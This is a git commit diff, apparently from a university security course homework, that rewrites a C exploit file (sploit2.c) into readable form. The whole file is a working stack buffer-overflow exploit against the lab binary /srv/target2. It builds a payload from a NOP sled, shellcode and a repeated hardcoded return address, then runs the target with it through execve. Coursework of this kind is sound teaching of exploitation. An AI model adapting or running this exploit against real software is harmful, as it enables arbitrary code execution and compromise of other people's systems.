1015b797b282dad6f5ef14539038642b56dff01a
justinhalford <justinhalford@gmail.com>
2024-05-10 18:26:09 -0400

    may 7

--- cs5435-hw4/sploits/sploit2.c
+++ cs5435-hw4/sploits/sploit2.c
@@ -5,9 +5,28 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define T "/srv/target2"
-const int S=409,O=201;const uint32_t R=0xffffdb5c;
-void f(char*b){memset(b,0x90,S-1);memcpy(b+O,shellcode,sizeof(shellcode)-1);
-for(int i=O+sizeof(shellcode)-1;i<S-1;i+=4)*(uint32_t*)(b+i)=R;b[S-1]=0;}
-int main(void){char*a[4],*e[1],b[S];f(b);a[0]=T;a[1]=b;a[2]="65935";
-a[3]=NULL;e[0]=NULL;execve(T,a,e);fprintf(stderr,"execve failed.\n");return 0;}
+#define TARGET "/srv/target2"
+const int BUF_SIZE = 409, OFFSET = 201;
+const uint32_t RET_ADDR = 0xffffdb5c;
+
+void preparePayload(char *buffer) {
+    memset(buffer, 0x90, BUF_SIZE - 1);
+    memcpy(buffer + OFFSET, shellcode, sizeof(shellcode) - 1);
+    for (int i = OFFSET + sizeof(shellcode) - 1; i < BUF_SIZE - 1; i += 4) {
+        *(uint32_t *)(buffer + i) = RET_ADDR;
+    }
+    buffer[BUF_SIZE - 1] = '\0';
+}
+
+int main(void) {
+    char *args[4], *env[1], payload[BUF_SIZE];
+    preparePayload(payload);
+    args[0] = TARGET;
+    args[1] = payload;
+    args[2] = "65935";
+    args[3] = NULL;
+    env[0] = NULL;
+    execve(TARGET, args, env);
+    fprintf(stderr, "execve failed.\n");
+    return 0;
+}
